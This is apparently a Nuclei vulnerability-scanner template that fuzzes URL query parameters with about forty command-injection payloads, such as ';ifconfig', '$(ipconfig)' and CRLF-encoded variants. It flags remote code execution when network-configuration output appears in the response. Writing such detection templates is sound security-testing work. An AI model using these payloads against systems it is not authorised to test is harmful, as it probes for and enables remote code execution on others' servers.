http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: postfix
  matchers:
  - condition: and
    type: word
    words:
    - inet
    - netmask
    - broadcast
  - condition: and
    type: word
    words:
    - Windows IP Configuration
    - Subnet Mask
  - type: word
    words:
    - 'ifconfig: command not found'
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - ;ifconfig
    - '||ifconfig||'
    - ;ifconfig;
    - '&ifconfig'
    - '&&ifconfig'
    - '%0D;ifconfig'
    - '%0A;ifconfig'
    - '%0D%0A;ifconfig'
    - '%0D%0A||ifconfig||'
    - '%0D%0A&&ifconfig&&'
    - '%0D||ifconfig'
    - '%0A||ifconfig'
    - '%0D%0A||ifconfig'
    - '%0D&&ifconfig'
    - '%0A&&ifconfig'
    - '`ifconfig`'
    - ;`ifconfig`
    - $(ifconfig)
    - ;$(ifconfig)
    - '||`ifconfig`'
    - ;ipconfig
    - '||ipconfig||'
    - ;ipconfig;
    - '&ipconfig'
    - '&&ipconfig'
    - '%0D;ipconfig'
    - '%0A;ipconfig'
    - '%0D%0A;ipconfig'
    - '%0D%0A||ipconfig||'
    - '%0D%0A&&ipconfig&&'
    - '%0D||ipconfig'
    - '%0A||ipconfig'
    - '%0D%0A||ipconfig'
    - '%0D&&ipconfig'
    - '%0A&&ipconfig'
    - '`ipconfig`'
    - ;`ipconfig`
    - $(ipconfig)
    - ;$(ipconfig)
    - '||`ipconfig`'
  stop-at-first-match: true
id: rce-ipconfig-ifconfig-postfix
info:
  author: reewardius
  name: RCE via ppconfig && ifconfig
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
